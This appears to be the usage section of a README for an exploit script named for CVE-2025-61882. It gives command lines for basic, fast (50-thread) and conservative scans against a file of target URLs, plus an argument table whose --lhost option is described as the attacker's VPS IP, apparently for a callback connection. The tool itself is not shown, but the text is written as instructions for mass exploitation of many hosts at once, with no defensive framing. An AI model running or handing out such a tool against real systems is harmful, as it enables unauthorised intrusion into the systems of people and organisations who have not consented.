Basic Scan
python3 cve-2025-61882.py --targets targets.txt --lhost YOUR_VPS_IP

Fast Scan (50 threads)
python3 cve-2025-61882.py --targets targets.txt --lhost YOUR_VPS_IP --threads 50

Conservative Scan (10 threads)
python3 cve-2025-61882.py --targets targets.txt --lhost YOUR_VPS_IP --threads 10

Configuration

| Argument | Required | Default | Description |
|----------|----------|---------|-------------|
| `--targets` | Yes | - | Path to file containing target URLs |
| `--lhost` | Yes | - | Your VPS/attacker IP address |
| `--threads` | No | 20 | Number of concurrent threads |



